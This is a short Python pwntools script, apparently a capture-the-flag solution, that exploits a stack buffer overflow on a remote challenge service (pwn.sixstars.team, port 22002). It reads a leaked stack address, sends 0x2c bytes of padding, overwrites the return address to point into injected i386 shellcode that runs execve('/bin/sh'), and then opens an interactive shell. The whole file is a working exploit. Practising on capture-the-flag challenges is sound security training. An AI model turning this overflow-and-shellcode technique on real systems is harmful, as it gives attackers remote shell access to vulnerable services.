#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2019 ctf <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *
context.log_level="debug"
r=remote("pwn.sixstars.team",22002)

r.recvuntil("at ")
a=r.recv(10)
r.recv()
a=int(a,16)
print hex(a)
shellcode="""
    call here
    .ascii "/bin/sh"
    .byte 0
here:
    pop ebx
    xor ecx,ecx
    xor edx,edx
    mov eax,11
    int 0x80
"""
sh=asm(shellcode)
shellcode='a'*0x28+'a'*0x4+p32(a+0x28+0x8)+asm(shellcode)
r.sendline(shellcode)

r.interactive()
